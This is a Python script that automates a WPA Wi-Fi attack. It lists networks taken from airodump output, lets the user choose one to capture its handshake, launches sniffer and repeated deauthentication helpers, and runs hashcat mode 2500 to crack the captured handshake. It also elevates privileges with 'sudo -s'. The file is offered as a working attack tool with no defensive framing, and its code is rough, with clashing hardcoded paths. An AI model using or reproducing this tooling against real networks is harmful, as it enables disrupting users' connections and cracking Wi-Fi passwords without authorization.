import subprocess#import
import os
import time
from time import sleep
import csv

import queue
import sys
import platform
from subprocess import *#Popen, CREATE_NEW_CONSOLE

import pipes
monitor='/home/vmuser/Desktop/DATA/monitor-01.csv'
affix='monitor'#+str(time.time())
affic='airodump'#+str(time.time())
path='/home/pegasus/Desktop/DATA/'+affix
path2='/home/pegasus/Desktop/DATA/'+affic


keys=['BSSID', 'First time seen', 'Last time seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', '# beacons', '# IV', 'LAN IP', 'ID-length', 'ESSID', 'Key']

try:
	os.remove('temp.csv')
except:
	pass

try:
	os.remove('/home/pegasus/Desktop/DATA/monitor-01.csv')
except:
	pass
	
try:
	os.remove('/home/pegasus/Desktop/DATA/airodump-01.csv')
except:
	pass
	

def readlines():
	print('Please select a network')	
	print('')
	file=open(monitor,'r')
	csv_reader= csv.reader(file)
	mass=[]
	
	for row in csv_reader:
		mass.append(row)
	bass=[]
	
	for x in range (2,12):
		hues=mass[x]
		
		if hues:
			bass.append(hues)

		else:
			break
			
	
	networks=[]
		
	for x in range (len(bass)):
		raw=bass[x]

		network={}
		for y in range (len(keys)):
		
			para=raw[y]
			key=keys[y]
	
			network[key]=para
		network['Number']=x
		networks.append(network)
	
	return networks	


	
def crack():
		
	bash='HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh'
	subprocess.call(bash, shell=True)
	
def choosetohack(networks):
	
	print('')
	print(' ',len(networks),'networks read from file')
	print('')
	
	for x in range (len(networks)):
		
		bssid=networks[x]['BSSID']
		essid=networks[x]['ESSID']
		
		ch=networks[x]['channel']
		#print(ch)
		#sleep(10)
		channel=int(ch[2])
		print(x,bssid,'ch:',channel,essid,)
	
	print('')
	print('Enter num of network to catch handshake')
	print('')
	
	chosennum=int(input())
	print('Net',chosennum,'chosen!')
	chosennetwork=networks[chosennum]
	return chosennetwork


def startmonitorfunc():
	script='startmonitor.py'
	cmd = ['gnome-terminal', '-x', 'bash', '-c']
	subprocess.Popen(cmd + ['python3 %s' % (script)])
	print('Monitor started')
	print('')
	sleep(3)
	print('Kill the monitor when network is found')
	input()

	
	
def startsnifferfunc():
	script='startsniffer.py'
	cmd = ['gnome-terminal', '-x', 'bash', '-c']
	subprocess.Popen(cmd + ['python3 %s' % (script)])
	print('Sniffer started')
	print('')
	


def startdeuath():
	script='startdeuath.py'
	cmd = ['gnome-terminal', '-x', 'bash', '-c']
	subprocess.Popen(cmd + ['python3 %s' % (script)])
	
	print('Deauth started')
	print('')
	
def main():

	#bash='rfkill unblock all'
	#subprocess.call(bash, shell=True)
	#sleep(3)
	#print('rfkill unblocked')
	startmonitorfunc()
	networks=readlines()
	chosen=choosetohack(networks)
	path='temp.csv'
	file=open(path,'w+')

	with open('temp.csv', 'w+') as csv_file:
		writer = csv.writer(csv_file)
		for key, value in chosen.items():
			writer.writerow([key, value],)

	startsnifferfunc()
	
	
	while True:
		print('Press Enter to start DEAUTH attack')
		input()
		startdeuath()
		sleep(5)
	
	
	

	# cap2hccapx.bin airodump-01.cap airodump.hccapx #

	
	
bash='sudo -s'
subprocess.call(bash, shell=True)	
main()

	









